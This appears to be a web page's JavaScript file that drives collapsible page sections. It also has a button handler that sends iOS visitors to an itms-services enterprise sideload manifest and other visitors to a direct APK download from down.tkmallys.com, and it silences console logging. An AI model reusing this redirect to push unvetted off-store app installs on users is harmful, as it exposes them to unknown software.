var coll = document.getElementsByClassName("collapsible");
var i;

for (i = 0; i < coll.length; i++) {
  coll[i].addEventListener("click", function() {
    this.classList.toggle("active");
    var content = this.nextElementSibling;
    if (content.style.display === "block") {
      content.style.display = "none";
    } else {
      content.style.display = "block";
    }
  });
}

var iiijv0001 = document.getElementById("iiijv0001");
iiijv0001.addEventListener("click", function() {
  var buttonText1 = document.getElementById("iiijv0001_1");
  var currentText1 = buttonText1.innerHTML.trim();
  if (currentText1 === "+&nbsp;&nbsp;") {
    buttonText1.innerHTML = "-&nbsp;&nbsp;";
  } else {
    buttonText1.innerHTML = "+&nbsp;&nbsp;";
  }
});

var iiijv0002 = document.getElementById("iiijv0002");
iiijv0002.addEventListener("click", function() {
  var buttonText2 = document.getElementById("iiijv0002_1");
  var currentText2 = buttonText2.innerHTML.trim();
  if (currentText2 === "+&nbsp;&nbsp;") {
    buttonText2.innerHTML = "-&nbsp;&nbsp;";
  } else {
    buttonText2.innerHTML = "+&nbsp;&nbsp;";
  }
});

var iiijv0003 = document.getElementById("iiijv0003");
iiijv0003.addEventListener("click", function() {
  var buttonText3 = document.getElementById("iiijv0003_1");
  var currentText3 = buttonText3.innerHTML.trim();
  if (currentText3 === "+&nbsp;&nbsp;") {
    buttonText3.innerHTML = "-&nbsp;&nbsp;";
  } else {
    buttonText3.innerHTML = "+&nbsp;&nbsp;";
  }
});

var iiijv0004 = document.getElementById("iiijv0004");
iiijv0004.addEventListener("click", function() {
  var buttonText4 = document.getElementById("iiijv0004_1");
  var currentText4 = buttonText4.innerHTML.trim();
  if (currentText4 === "+&nbsp;&nbsp;") {
    buttonText4.innerHTML = "-&nbsp;&nbsp;";
  } else {
    buttonText4.innerHTML = "+&nbsp;&nbsp;";
  }
});

var iiijv0005 = document.getElementById("iiijv0005");
iiijv0005.addEventListener("click", function() {
  var buttonText5 = document.getElementById("iiijv0005_1");
  var currentText5 = buttonText5.innerHTML.trim();
  if (currentText5 === "+&nbsp;&nbsp;") {
    buttonText5.innerHTML = "-&nbsp;&nbsp;";
  } else {
    buttonText5.innerHTML = "+&nbsp;&nbsp;";
  }
});


     function buttonClickHandler() {
  var userAgent = navigator.userAgent;
  var appUrl;

  if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) {
    appUrl = "itms-services://?action=download-manifest&url=https://down.tkmallys.com/2/local.plist";
  } else {
    appUrl = "https://down.tkmallys.com/2/app.apk";
  }

  window.location.href = appUrl;
}


var bt001bt001 = document.getElementById("bt001");
bt001bt001.addEventListener("click", buttonClickHandler);

var stg1stg1 = document.getElementById("stg1");
stg1stg1.addEventListener("click", buttonClickHandlerG);

var sta1sta1 = document.getElementById("sta1");
sta1sta1.addEventListener("click", buttonClickHandlerA);

var logDebug = false;
console.log = (function (oriLogFunc) {
  return function () {
    if (logDebug) {
      oriLogFunc.apply(this, arguments);
    }
  }
})(console.log);
